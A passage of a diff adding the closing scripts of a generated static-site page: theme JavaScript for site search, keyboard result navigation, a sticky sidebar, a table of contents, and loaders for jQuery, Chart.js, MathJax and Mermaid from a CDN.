+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
